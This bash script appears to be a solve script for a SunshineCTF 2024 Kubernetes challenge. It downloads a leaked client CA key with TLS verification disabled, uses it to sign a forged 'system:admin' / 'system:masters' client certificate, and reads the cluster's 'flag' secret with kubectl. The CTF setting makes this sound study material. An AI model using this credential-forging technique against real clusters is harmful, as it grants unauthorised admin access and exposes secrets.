#!/bin/bash

# Variables
CLIENT_CA_CERT_PATH="./client-ca.crt"
CLIENT_CA_KEY_PATH="./client-ca.key"   # Replace with actual path to client CA key
CLIENT_CERT_PATH="client.crt"
CLIENT_KEY_PATH="client.key"
K3S_API="https://127.0.0.1:6444"  # Replace with the K3s server API address
curl -k https://static.2024.sunshinectf.games/client-ca.key >client-ca.key
curl -k https://static.2024.sunshinectf.games/client-ca.crt >client-ca.crt

# Step 1: Generate a private key for the client
echo "Generating client private key..."
openssl genrsa -out ${CLIENT_KEY_PATH} 2048

# Step 2: Create a Certificate Signing Request (CSR) for the client
echo "Creating client CSR..."
openssl req -new -key ${CLIENT_KEY_PATH} -out client.csr -subj "/CN=system:admin/O=system:masters"

# Step 3: Sign the client CSR with the client CA certificate and key to create the client certificate
echo "Signing the client certificate..."
openssl x509 -req -in client.csr \
  -CA ${CLIENT_CA_CERT_PATH} \
  -CAkey ${CLIENT_CA_KEY_PATH} \
  -CAcreateserial \
  -out ${CLIENT_CERT_PATH} \
  -days 365 -sha256

# Step 4: Use the client certificate to interact with the K3s API server
echo "Retrieving Kubernetes secrets using client certificate..."
#timeout 1 openssl s_client -showcerts -connect 127.0.0.1:6443 -servername k3s-server-ca@1729353174 |openssl x509 -outform PEM > server-ca.crt
curl -k https://static.2024.sunshinectf.games/server-ca.crt >server-ca.crt

kubectl --kubeconfig=config get secret flag -o jsonpath="{.data.value}" | base64 -d


rm client.crt
rm client.key
rm *.srl
rm *.csr
rm server-ca.crt
